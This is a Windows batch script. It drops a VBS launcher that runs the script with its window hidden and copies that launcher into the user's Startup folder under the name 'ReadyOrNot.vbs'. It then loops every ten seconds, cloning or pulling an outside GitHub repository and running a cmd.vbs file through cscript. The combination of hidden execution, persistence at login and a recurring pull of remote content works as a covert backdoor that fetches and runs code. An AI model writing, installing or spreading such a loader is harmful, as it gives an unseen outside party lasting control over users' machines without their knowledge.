@echo off
:: Variables for paths and repo URL
set "SCRIPTS_DIR=%userprofile%\Documents\Scripts"
set "VBS_FILE=%SCRIPTS_DIR%\silent_runner.vbs"
set "CMD_VBS=%SCRIPTS_DIR%\cmd.vbs"
set "STARTUP_VBS=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\ReadyOrNot.vbs"
set "REPO_URL=https://github.com/madmaxvoltro/ready-or-not.git"
set "CLONE_DIR=%userprofile%\ReadyOrNot"

:: Create the Scripts directory if it doesn't exist
if not exist "%SCRIPTS_DIR%" (
    mkdir "%SCRIPTS_DIR%"
)

:: Step 1: Create silent_runner.vbs to run the sync process silently
echo Set objShell = CreateObject("WScript.Shell") > "%VBS_FILE%"
echo objShell.Run "cmd /c ""%~f0""", 0, True >> "%VBS_FILE%"

:: Step 2: Copy VBS file to the startup folder
copy "%VBS_FILE%" "%STARTUP_VBS%" /Y

:: Step 3: Start the Git sync and cmd.vbs execution loop
setlocal

:loop
:: Clone or pull the repository
if not exist "%CLONE_DIR%" (
    git clone "%REPO_URL%" "%CLONE_DIR%"
) else (
    cd /d "%CLONE_DIR%"
    git pull
)

:: Check if the git pull was successful
if %ERRORLEVEL% EQU 0 (
    rem Optionally delete a specific file after successful pull (uncomment if needed)
    rem del /q "%CLONE_DIR%\sts.txt"
)

:: Run cmd.vbs script
if exist "%CMD_VBS%" (
    cscript //nologo "%CMD_VBS%"
)

:: Wait and loop
timeout /t 10 /nobreak >nul
goto loop

endlocal
exit /b 0
